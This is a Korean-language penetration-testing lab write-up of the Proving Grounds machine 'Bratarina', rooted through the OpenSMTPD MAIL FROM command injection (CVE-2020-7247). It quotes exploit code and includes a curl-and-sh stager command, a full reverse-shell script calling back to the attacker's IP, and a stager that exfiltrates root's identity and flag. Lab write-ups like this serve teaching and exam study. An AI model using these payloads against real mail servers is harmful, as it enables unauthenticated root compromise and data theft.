---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/svc/smtp
  - tech/web/cmd-injection
  - tech/payload/revshell
  - tech/svc/smb
type: machine
platform: pg
os: linux
ip: 192.168.248.71
ports: [22, 25, 80, 445]
services: [http, netbios-ssn, smtp, ssh]
cves: [CVE-2020-7247]
status: solved
manual_tags: true
manual_cves: true
manual_domain: true
tech_count: 4
---
> [!info] Bratarina — PG Practice / Linux / Fundamental / 플래그 1개(root)
> 타겟 `192.168.248.71`, 호스트명 `bratarina`. 진입점: 25/tcp OpenSMTPD `MAIL FROM` 명령 인젝션(CVE-2020-7247) — 로컬파트 검증 우회로 로컬 배달(mda) 명령줄에 임의 명령 삽입, 배달이 root 로 돌아 **권한상승 단계 없이 곧장 root**. 80(FlaskBB)·445(SMB) 는 둘 다 막다른 길.
>
> 최초 풀이 2026-08-20 12:50~13:09 KST — root 셸 회수까지 11분, 플래그 검증 완료까지 19분. 같은 날 13:30~13:36 재실측(타겟이 아직 살아 있어 RCE 가 root 로 도는 것과 플래그 값을 재확인, 리버스셸은 다시 띄우지 않음). 박스는 **정지됨** — 이하 재접속을 전제한 서술 없음.
>
> 전 과정을 헤드리스 SSH 로 진행해 **스크린샷 0장.** 증거는 전부 기계 로그(`~/PG/Bratarina/` 산출물, `tcpdump_callback.log` 100KB 포함). 시험장에서는 반대로 스크린샷이 증거의 본체 — [[_PLAYBOOK#C-4. 스크린샷]].
>
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.71

### Initial Access – OpenSMTPD MAIL FROM 로컬파트 검증 우회로 root 로컬배달에 명령을 주입하는 무인증 RCE (CVE-2020-7247)

**Vulnerability Explanation:**
- OpenSMTPD 의 `smtp_mailaddr()` 이 로컬파트 검증(`valid_localpart()`) 실패에도 **도메인이 비어 있으면 통과**시키는 결함. `MAIL FROM:<;CMD;>`(`@도메인` 없음)로 검증 우회
- 그 주소 문자열이 로컬 배달(mda) 명령줄에 그대로 삽입됨. 배달 프로세스가 root 로 실행되므로 주입 명령도 root 실행 — 권한상승 단계 없이 곧장 root
- 영향범위: 2018-05 커밋 `a8e222352f` 이후 ~ **6.6.2p1 미만**(그 이전 버전은 해당 없음). 배너는 버전을 노출하지 않고 HELP 응답의 `2.0.0` 은 ENHANCEDSTATUSCODES 상태코드지 버전이 아님 — blind PoC 로만 판정 가능

**Vulnerability Fix:**
- OpenSMTPD **6.6.2p1** 이상으로 패치. 고쳐진 것은 이스케이프가 아니라 `smtp_mailaddr()` 의 반환값 — 검증 실패를 실패로 돌려주는 것이 전부
- 로컬 배달을 mda 셸로 태우지 말고 전용 배달 에이전트로, 최소권한(비 root)으로 실행
- egress 필터. 이 박스에서 관측된 회수 회선은 tcp/80 하나뿐이었고, 그것마저 막았다면 회수가 훨씬 까다로웠을 것

**Severity:** Critical — 무인증 원격 RCE, 즉시 root

**Steps to reproduce the attack:**
1. 25/tcp OpenSMTPD 확인 — HELP 응답의 `2.0.0` 은 버전이 아니므로 blind PoC 로 판정
2. `MAIL FROM:<;ping -c 4 <LHOST>;>` 인젝션 후 ICMP 회신으로 취약성 확정
3. Kali 80 에 HTTP 서버로 리버스셸 스크립트 배치
4. 인젝션으로 `curl <LHOST>/x -o /tmp/x; sh /tmp/x` 실행 — `|`·`$`·`>` 회피(문자 제약, 아래 상세 재현 참조)
5. 80 을 nc 리스너로 교체 후 스크립트 실행 → root 셸 회수
6. 대화형 셸에서 `/root/proof.txt` 원위치 `cat`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.71 | TCP: 22, 25, 80, 445 |

```text
# Nmap 7.98 scan initiated Thu Aug 20 12:50:34 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Bratarina/nmap.log 192.168.248.71
Host is up (0.092s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.207], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
```
— 출처: `~/PG/Bratarina/nmap.log`

`-p-` 전 포트, `-Pn` 은 ICMP 차단 대비, `--min-rate 5000` 로 65535 포트를 80 초에 스캔. UDP 상위 100 은 전부 `open|filtered`(무응답) — `nmap_udp.log`, 진입점 없음.

`Not shown: 65530 filtered` — 열린 5 개 말고는 전부 무응답 필터. 139/tcp 도 여기 포함되고, 아래 SMB 절의 `smbclient -L` SMB1 리스팅이 `NT_STATUS_IO_TIMEOUT` 으로 죽는 이유가 이것 — 도구 문제가 아니라 nmap 이 이미 알려준 사실.

**SMTP 버전 판정 — 배너는 버전을 주지 않음.** nmap 의 `smtp-commands` 한 줄만 보면 "OpenSMTPD 2.0.0" 로 읽히나, 직접 EHLO/HELP 를 쳐보면 오독. 아래는 `revalidate_smtp_help.txt` 원문(재실측, 2026-08-20 13:30 KST). `>>>` 는 이쪽이 보낸 것:

```text
220 bratarina ESMTP OpenSMTPD
>>> EHLO test
250-bratarina Hello test [192.168.45.207], pleased to meet you
250-8BITMIME
250-ENHANCEDSTATUSCODES
250-SIZE 36700160
250-DSN
250 HELP
>>> HELP
214-2.0.0 This is OpenSMTPD
214-2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org
214-2.0.0 with full details
214 2.0.0 End of HELP info
>>> QUIT
221 2.0.0 Bye
```
— 출처: `~/PG/Bratarina/revalidate_smtp_help.txt`. 최초 풀이 때 뜬 `smtp_probe1.txt`(12:53:21)의 214 줄도 한 글자도 다르지 않음

HELP 응답 각 줄의 `2.0.0` 은 ENHANCEDSTATUSCODES 상태코드 — `214-2.0.0 with full details` 처럼 문장 조각에도 똑같이 붙어 버전이라면 불가능한 형태. nmap 이 여러 214 줄을 이어 붙이며 앞뒤 `2.0.0` 을 섞어 "OpenSMTPD 2.0.0" 처럼 보이게 만든 것 — `VERSION` 칼럼이 그냥 `OpenSMTPD` 인 것도 같은 이야기. 취약 범위(2018-05 커밋 이후 ~ 6.6.2p1 미만)는 `47984.py` 헤더·`48038.rb` 타깃명·Qualys 어드바이저리 표기이고, **여기선 판정 근거를 배너에서 못 뽑아 PoC 실측이 유일한 근거**.

**SMB(445) — null session, 막다른 길.** null session(익명, 빈 사용자/빈 암호) 허용, guest 로그인은 `STATUS_LOGON_FAILURE`. 공유는 `backups`(Disk)와 `IPC$` 둘.

```text
# smbclient -N -L //192.168.248.71/
	Sharename       Type      Comment
	backups         Disk      Share for backups
	IPC$            IPC       IPC Service (Samba 4.7.6-Ubuntu)

# rpcclient -N -c 'netshareenumall'
netname: backups
	path:	C:\opt\samba
netname: IPC$
	path:	C:\tmp
```
— 출처: `~/PG/Bratarina/smbmap.txt` · `smb_shares.txt` · `smb_share_path.txt`

`backups` = 서버의 `/opt/samba`. 익명 읽기만 되고 쓰기·트래버설은 전부 거부:

```text
# 쓰기 시도 (smbclient put) -> NT_STATUS_ACCESS_DENIED
# 공유 밖으로 트래버설
-- ls '../'            -> NT_STATUS_NO_SUCH_FILE
-- ls '../../../etc/'  -> NT_STATUS_OBJECT_NAME_NOT_FOUND
```
— 출처: `~/PG/Bratarina/smb_traversal.txt`

`rpcclient netsharegetinfo backups` 의 DACL 은 `SID: S-1-1-0`(Everyone)에 full(0x1f01ff) 로 보이는데도 PUT 은 거부됨 — 공유 ACL 이 write 를 허용해도 Samba 설정이나 파일시스템 퍼미션이 우선 거부하면 실제로는 못 씀. [가정] 정확한 거부 원인(smb.conf 대 fs 퍼미션)은 root 셸에서 미확인.

공유의 유일한 파일은 `passwd.bak`(1747 B), `/etc/passwd` 사본. 해시는 없고(그림자 파일 아님) 값은 사용자명 목록뿐:

```text
root:x:0:0:root:/root:/bin/bash
neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
_smtpq:x:1002:1002:SMTPD Queue:/var/empty:/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```
— 출처: `~/PG/Bratarina/smb_loot/passwd.bak`

`_smtpd`/`_smtpq` 계정이 OpenSMTPD 설치를 재확인. `neil`·`postgres` 는 SSH/메일 크리덴셜 후보였으나, 이 박스는 크리덴셜 없이 SMTP RCE 로 풀려 사용자명은 쓰이지 않음. TRIED AND FAILED — `smbmap` guest(계정 비활성으로 거부) · `enum4linux-ng` LDAP/LDAPS/NetBIOS-139 검사(전부 타임아웃, 필터 포트라 예상된 결과) · RPC user/group enum(0 users, 0 groups — standalone SAM 없음). 상세는 [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]].

**웹(80) — FlaskBB 는 데코이.** 정적 자산은 뜸(`/static/css/styles.css` 200, 477855 B). 동적 라우트는 전부 같은 404 페이지(6461 B):

```text
/login /register /auth /user /forum /topic /admin /management /post
  -> 전부 404, 응답 크기 6461 로 동일
```
— 출처: `~/PG/Bratarina/web_flaskbb_paths.txt`

gobuster(dirb `common.txt`) 결과는 셋뿐 — `/index.html`(200, stock nginx 페이지) · `/robots.txt`(200, Disallow 없음) · `/static`(301→403, autoindex off). Host 헤더를 6종(`bratarina`·`localhost`·`coffeecorp.com`·`bratarina.coffeecorp.com`·`flaskbb.local`·IP)으로 바꿔도 전부 404 — vhost 문제 아님. 로그인도 회원가입도 포럼 콘텐츠도 없고 주입할 입력 자체가 없어 80 은 함정으로 확정(출처: `gobuster_80_stdout.txt`·`web_vhost_probe.txt`).

### Initial Access – OpenSMTPD MAIL FROM 인젝션 → 2단계 페이로드로 root 셸

**페이로드 구조.** `47984.py`(exploit-db 47984)가 보내는 핵심 줄:

```python
s.send(b'HELO x\r\n')
s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD), 'utf-8'))
s.send(b'RCPT TO:<root>\r\n')     # root 로 로컬 배달 유도
s.send(b'DATA\r\n')
s.send(b'\r\nxxx\r\n.\r\n')       # 본문 종료 -> 배달 트리거 -> 인젝션 실행
s.send(b'QUIT\r\n')
```

`MAIL FROM:<;CMD;>` — 로컬파트를 `;CMD;` 로. `@도메인` 이 없어 "도메인 비면 통과" 분기를 탐. `RCPT TO:<root>` 로 root 로컬 배달, `.` 한 줄로 DATA 종료가 배달·인젝션 실행을 트리거.

**문자 제약 — 삭제가 아니라 치환.** msf 모듈 `48038.rb`(같은 CVE)의 `MyBadChars`:

```ruby
'MyBadChars' => "!\#$%&'*?`{|}~\r\n".chars
```

이 목록(`! # $ % & ' * ? \` { | } ~` + CR/LF)은 OpenSMTPD 의 `MAILADDR_ESCAPE` 와 정확히 같은 집합. 검사 대상은 `from`(MAIL FROM 문자열)이지 payload 가 아님 — msf 는 진짜 payload 를 주소가 아니라 **DATA 본문**으로 보냄(아래 comment slide 참조).

이 문자들은 **사라지는 것이 아니라 콜론(`:`)으로 치환됨.** `curl LHOST/x|sh` 는 `curl LHOST/x:sh` 라는 URL 하나짜리 명령이 되고(파이프 소실), `$(id -u)` 는 `:(id -u)` 가 되어 셸이 `(` 에서 문법 오류로 죽음. 요청 로그에 실물로 찍힌 자리(`http_stager.log`):

```text
192.168.248.71 - - [20/Aug/2026 12:57:13] code 404, message File not found
192.168.248.71 - - [20/Aug/2026 12:57:13] "GET /x:sh HTTP/1.1" 404 -
192.168.248.71 - - [20/Aug/2026 12:57:50] code 404, message File not found
192.168.248.71 - - [20/Aug/2026 12:57:50] "GET /CURLTEST HTTP/1.1" 404 -
192.168.248.71 - - [20/Aug/2026 12:57:56] code 404, message File not found
192.168.248.71 - - [20/Aug/2026 12:57:56] "GET /WGETTEST HTTP/1.1" 404 -
192.168.248.71 - - [20/Aug/2026 12:58:37] "GET /x HTTP/1.1" 200 -
192.168.248.71 - - [20/Aug/2026 13:00:52] "GET /x HTTP/1.1" 200 -
```
— 출처: `~/PG/Bratarina/http_stager.log`(전량)

읽는 법:
- `12:57:13 GET /x:sh` — `curl LHOST/x|sh` 인젝션의 흔적. 파이프만 콜론으로 바뀜
- `12:57:50`·`12:57:56` — `CURLTEST`·`WGETTEST` 존재 확인 프로브
- `12:58:37`·`13:00:52` `GET /x` 200 — `-o` 우회로 재시도한 스크립트 fetch 성공

`/x:sh` 는 서버가 실제로 받은 요청 경로 — 파이프가 지워졌다면 `/xsh`, 정상 분리됐다면 `/x` 였을 것. `:` 라야 이 경로가 나오므로 삭제가 아니라 치환이 증명됨.

⚠️ **문자 제약을 「필터링(삭제)」로 알고 있으면 이 404 를 「curl 이 없나?」로 오독함.** 실제로 그렇게 돼 `CURLTEST`/`WGETTEST` 라는 엉뚱한 확인에 시간을 씀 — `12:57:13`(치환된 요청 도착) → `12:58:37`(fetch 성공)까지 **84초** 소요.

주소를 잘라먹는 문자도 둘 — `smtp_mailaddr()` 은 첫 `>` 에서 주소를 끊고, 그 다음 첫 `:` 앞을 통째로 버림. `>` 를 쓰면 뒤가 날아가 `bash -i >& /dev/tcp/…` 를 인라인으로 못 넣고, `:` 를 쓰면 앞이 날아가 URL 에 `http://` 를 못 붙임(스킴 없는 URL 로 우회, 아래 재실측의 `CURLNOSCHEME` 프로브가 이것을 검증).

이 박스에서 통과가 확인된 문자는 영숫자·`;`·공백·`-`·`.`·`/` — 성공한 인젝션이 쓴 것이 그것뿐. [가정] `(` `)` `,` `=` `_` 도 통과할 것으로 보이나 이 박스에서 던져보지는 않음.

**수동 대안(msf 1대 제한 대비) — `47984.py`(순수 python 소켓)로 대체 가능, 전 대상 허용.** 더 원시적으로는 `nc`/`telnet` 으로 `HELO x` → `MAIL FROM:<;CMD;>` → `RCPT TO:<root>` → `DATA` → `.` 순서를 손으로 쳐도 됨.

**아웃바운드 fetch 자체가 필요 없는 대안(Qualys 원안, 이 박스에서는 미사용)** — `48038.rb` 소스의 comment slide 기법:

```ruby
from = ";for #{rand_text_alpha(1)} in #{iter};do read;done;sh;exit 0;"
body = "\r\n" + "#\r\n" * 15 + payload.encoded
```

주소에는 `;for a in <15개 토큰>;do read;done;sh;exit 0;` 만 넣음(전부 통과 문자). `read` 를 15번 돌려 서버가 앞에 붙인 메일 헤더를 버리고, 그 다음 `sh` 가 DATA 본문의 나머지를 표준입력으로 읽어 실행 — 본문에는 문자 제약이 없어 리버스셸 한 줄을 그대로 삽입 가능. 주소로 못 넣을 페이로드는 본문으로 넣으면 HTTP 스테이징 자체가 불필요해짐.

**실제로 쓴 경로 — 2단계 페이로드.** [가정] 관측된 성공 회선은 tcp/80 하나뿐 — tcpdump 캡처는 *성공한* 회선만 보여줘 「다른 포트를 안 썼다」와 「시도했으나 egress 에서 막혔다」를 구분 못 함(상세는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]]). 인젝션에는 `>`·`|`·`$` 를 못 쓰므로:

1. Kali 80 에 HTTP 서버로 리버스셸 스크립트 `x` 배치
2. 인젝션으로 `curl … -o /tmp/x; sh /tmp/x` 전송 — 스킴 없는 URL(`:` 회피), 파이프 대신 `-o`(`|` 회피), 리다이렉트 없음(`>` 회피)
3. **다운로더와 리스너가 같은 포트(80)를 물려면 Kali 쪽에서 시분할이 필요** — `http.server` 로 스크립트를 내려보낸 뒤 그 프로세스를 내리고 80 을 nc 리스너로 교체. `tcpdump_callback.log` 의 SYN 타임스탬프로 실제 시분할이 찍힘: `13:00:52` GET `/x`(http.server) → `13:01:47` 리버스셸 접속(nc) — 55초 간격. [가정] 이 55초의 정확한 사연(재인젝션인지 OpenSMTPD 큐 재시도인지)은 산출물로 미확정
4. `x` 안에서 `/dev/tcp/…/80` 리버스셸 기동

받아온 스크립트 `www/x`(산출물 원문):

```sh
#!/bin/sh
L=192.168.45.207
P=80
setsid /bin/bash -c "bash -i >& /dev/tcp/$L/$P 0>&1" >/dev/null 2>&1 &
sleep 3
setsid python3 -c "import socket,os,pty;s=socket.socket();s.connect(('$L',$P));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')" >/dev/null 2>&1 &
```
— 출처: `~/PG/Bratarina/www/x`

파일 안에서는 `$L`·`>&` 를 자유롭게 사용 — HTTP 로 받아오는 바이트라 SMTP 주소 파서를 거치지 않아 치환·절단을 안 당함. 제약은 인젝션 단계에만 있음. `setsid … &` 는 인젝션을 실행하는 mda 프로세스가 리버스셸 자식을 물고 죽지 않게 셸을 세션에서 떼어내는 것. `sleep 3` 뒤 python pty 를 한 번 더 시도하는 것은 bash `/dev/tcp` 실패 시의 폴백이자 TTY 승격용.

리스너가 root 셸을 받은 기록(`shell.log`):

```text
listening on [any] 80 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.71] 47476
bash: cannot set terminal process group (2034): Inappropriate ioctl for device
bash: no job control in this shell
root@bratarina:~#
```
— 출처: `~/PG/Bratarina/shell.log`

`cannot set terminal process group` / `no job control` 은 TTY 없는 셸의 정상 증상. 프롬프트가 곧장 `root@bratarina` — 권한상승 없이 최초 접근이 root. OpenSMTPD 배달이 root 로 돌기 때문.

**재실측 (2026-08-20 13:30~13:36, 살아 있는 타겟).** 최초 풀이 뒤 타겟이 아직 살아 있어 RCE 가 root 로 도는 것과 플래그 값을 재확인. 리버스셸은 다시 띄우지 않음 — 확인 범위는 인젝션 → 명령 실행 → 플래그 회수까지.

먼저 인젝션의 실제 실행 여부를 ping 으로 확인:

```text
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:32:31.838093 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 1, length 64
13:32:31.838117 IP 192.168.45.207 > 192.168.248.71: ICMP echo reply, id 2213, seq 1, length 64
13:32:32.840046 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 2, length 64
13:32:33.841388 IP 192.168.248.71 > 192.168.45.207: ICMP echo request, id 2213, seq 3, length 64
```
— 출처: `~/PG/Bratarina/revalidate_tcpdump.log`

이어 스테이징 확인(Kali `http.server` 로그):

```text
192.168.248.71 - - [20/Aug/2026 13:34:39] code 404, message File not found
192.168.248.71 - - [20/Aug/2026 13:34:39] "GET /CURLNOSCHEME HTTP/1.1" 404 -
192.168.248.71 - - [20/Aug/2026 13:36:10] "GET /r HTTP/1.1" 200 -
192.168.248.71 - - [20/Aug/2026 13:36:10] code 404, message File not found
192.168.248.71 - - [20/Aug/2026 13:36:10] "GET /LIVEROOT-0-root-bratarina-16677ad43054a7953b4bcc9d30ce582b HTTP/1.1" 404 -
```
— 출처: `~/PG/Bratarina/revalidate_http.log`

13:34:39 의 `CURLNOSCHEME` 는 스킴 없는 URL 로 curl 이 도는지 확인한 프로브 — 404 회신이 왔다는 것은 스킴 없이도 curl 이 정상 동작한다는 뜻. 13:36:10 의 두 줄이 본체 — 스테이저 `/r` 을 받아 실행했고, 그 안에서 만든 URL 이 `LIVEROOT-0-root-bratarina-16677ad43054a7953b4bcc9d30ce582b` 로 회신 — `uid=0`, user `root`, host `bratarina`, 플래그. 파일 안에 넣은 `$( )` 는 정상 확장됨.

스테이저 `/r` 본문은 정리하며 지웠으므로(아래 남긴 흔적) 산출물에 없음. 회신 URL 로 역산하면 `id -u`·`id -un`·`hostname`·`cat /root/proof.txt` 를 이어붙인 것. [가정] 정확한 스크립트 원문은 미보존.

같은 시간대에 `$( )` 를 인라인으로 넣은 인젝션도 던졌으나 회신 없음 — `$` → `:` 치환으로 `curl …/UID:(id -u)` 가 되어 셸이 `(` 에서 죽으면 curl 자체가 실행되지 않으므로 무회신은 예상된 결과. 다만 그 인젝션의 정확한 문자열은 산출물로 남기지 못했고 남은 것은 회신 부재뿐. [가정] 인라인 실패 — 치환이 실제로 일어난다는 것 자체는 부재가 아니라 위 `GET /x:sh` 가 증명함.

**Local.txt value:** 없음.

이 박스는 **단일 플래그(root proof.txt)** — `verify_shell.log` 의 전수 탐색이 아래 근거:

```bash
root@bratarina:~# <txt -o -name local.txt \) 2>/dev/null; echo ENDMARK
uid=0(root) gid=0(root) groups=0(root)
bratarina
192.168.248.71 
===
16677ad43054a7953b4bcc9d30ce582b
===
/root/proof.txt
ENDMARK
```
— 출처: `~/PG/Bratarina/verify_shell.log`

`<txt -o -name local.txt \)` 는 `find / -name proof.txt -o -name local.txt \) 2>/dev/null` 의 뒤쪽만 보이는 것 — 원문 파일에 프롬프트 바로 뒤 캐리지리턴(`\r`)이 박혀 그 뒤부터 이 조각이 시작함. [가정] 정확한 원인(터미널 폭 되감기인지 로그 캡처 방식인지)은 미확정. 이 `find` 가 `proof.txt`·`local.txt` 두 이름을 **전수 탐색**했고 결과는 `/root/proof.txt` 단 하나 — `local.txt` 는 이 인스턴스에 존재하지 않음. 이어지는 `id`·`hostname`·`ip`·플래그·경로는 온전함.

이것은 **nc 로 받은 대화형 셸**이지 웹셸이 아님 — 프롬프트가 있고, 플래그를 원위치에서 `cat`. OSCP 는 웹셸로 얻은 플래그를 0점 처리하므로 이 구분이 그대로 점수.

### Privilege Escalation – 없음 (초기 접근이 곧 root)

**Vulnerability Explanation:** 별도 권한상승 취약점 없음. OpenSMTPD 의 로컬 배달(mda)이 root 로 실행되므로 주입 명령도 root 로 실행됨. 최초 접근 셸의 첫 줄부터 `root@bratarina:~#`(`shell.log`), `uid=0(root) gid=0(root) groups=0(root)`(`verify_shell.log`).

**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix 중 「로컬 배달을 비 root 최소권한으로 실행」이 이 항목도 함께 닫음.

**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).

**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 최초 셸이 root.

### Post-Exploitation

**Proof.txt value:** `16677ad43054a7953b4bcc9d30ce582b`

증거 원문은 `Initial Access – OpenSMTPD MAIL FROM 인젝션 → 2단계 페이로드로 root 셸` 절의 `verify_shell.log` 블록. 대화형 nc 셸에서 원위치 `cat` — 웹셸이 아니라는 판정 근거가 그 프롬프트.

**남긴 흔적**

- 타겟(192.168.248.71) — 최초 풀이 때 `/tmp/x`·`/tmp/r`(스테이저) 등을 떨굼. `verify_shell.log` 의 `/tmp` 리스팅에 남은 것은 시스템 디렉터리(`systemd-private-*`, `netplan_*`, `.X11-unix` 등)뿐이고 스테이저 파일은 안 보임 — 정리됐거나 tmpfs 라 재부팅 시 소멸. 재실측(13:36)에서 `/tmp/r` 를 한 번 더 생성(id/flag exfil 용 무해 스크립트). 타겟은 리버트/재부팅으로 초기화되므로 별도 원격 정리는 하지 않음. [가정] `/tmp` tmpfs 소멸
- Kali(10.44.44.128) — 재실측용 tmux 세션 `bratweb`(http.server 80)·`bratcap`(tcpdump) 종료, 80 리스너 없음. 스테이저 `~/PG/Bratarina/www/r` 는 삭제하고 원본 산출물 `www/x`·`www/e` 만 남김. 재실측 로그(`revalidate_*`)는 산출물로 보존 — 감사 시점(2026-08-20)에 `tmux ls`·`ss -lntp`·`ls ~/PG/Bratarina/www/` 로 셋 다 재확인

## 관련

- CVE-2020-7247 — OpenSMTPD `MAIL FROM` 명령 인젝션. 영향범위 2018-05 커밋 `a8e222352f` 이후 ~ 6.6.2p1 미만. Qualys 어드바이저리, openwall oss-security 2020-01-28 (`https://www.openwall.com/lists/oss-security/2020/01/28/3`)
- exploit-db 47984(`47984.py`) — 순수 python PoC, OSCP 에서 이걸 쓸 것(msf 아님)
- Metasploit `exploit/unix/smtp/opensmtpd_mail_from_rce`(`48038.rb`) — `MyBadChars` 목록과 comment slide 원안이 여기 있음. 모듈을 안 쓰더라도 소스는 읽을 값어치 있음
- [[Wombo]] — 아웃바운드 tcp/80 만 허용되는 동일 제약. 리버스셸 회수 시 포트 확인 습관
- [[_PLAYBOOK#B-23. OpenSMTPD MAIL FROM 로컬파트 검증 우회 — CVE-2020-7247]] · [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]] · [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-21. 웹 진입점에서 더 나갈 곳이 없다]]
- [[_STATUS]] — 283개 전수 진행현황
